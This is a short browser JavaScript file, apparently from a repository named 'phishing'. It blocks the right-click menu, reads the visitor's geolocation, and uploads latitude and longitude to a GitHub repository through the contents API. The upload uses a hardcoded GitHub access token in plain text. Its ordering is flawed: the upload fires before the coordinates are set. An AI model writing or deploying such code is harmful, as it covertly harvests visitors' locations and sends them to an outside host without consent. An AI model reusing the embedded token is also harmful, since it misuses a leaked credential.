let latitude;
let longitude;

document.addEventListener('contextmenu', function(event) {
  event.preventDefault();
}, true);

// if ("geolocation" in navigator) {
//   // 支持定位功能
//   navigator.geolocation.getCurrentPosition(function(position) {
//     // 獲取到位置信息
//     var latitude = position.coords.latitude; // 緯度
//     var longitude = position.coords.longitude; // 經度
    
//     // 在這裡可以將位置信息發送到後端進行處理，例如：
//     // $.post('/api/position', {latitude: latitude, longitude: longitude});
//   }, function(error) {
//     // 無法獲取位置信息
//     console.log('定位失敗：' + error.message);
//   });
// } else {
//   // 不支持定位功能
//   console.log('您的瀏覽器不支持定位功能。');
// }

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(showPosition);
} else {
  console.log("Geolocation is not supported by this browser.");
}

function showPosition(position) {
  latitude = position.coords.latitude;
  longitude = position.coords.longitude;
  console.log("Latitude: " + latitude + "<br>Longitude: " + longitude);
}

const url = "https://api.github.com/repos/neuropathy0829/phishing/contents/test.txt";

const data = {
  message: "Add location data",
  content: btoa(JSON.stringify({ 
    latitude: latitude,
    longitude: longitude 
  })),
};

const options = {
  method: "PUT",
  headers: {
    "Content-Type": "application/json",
    Authorization: "Bearer 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"
  },
  body: JSON.stringify(data),
};

fetch(url, options)
  .then((response) => response.json())
  .then((data) => console.log(data))
  .catch((error) => console.log(error));
